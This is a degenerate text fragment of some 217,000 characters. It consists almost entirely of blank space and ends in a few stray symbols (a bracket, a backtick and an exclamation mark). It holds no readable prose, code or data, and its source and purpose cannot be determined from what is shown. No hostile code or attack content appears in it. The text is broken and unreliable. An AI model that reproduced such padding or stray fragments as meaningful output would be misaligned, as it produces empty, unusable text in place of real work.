                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ]    `!    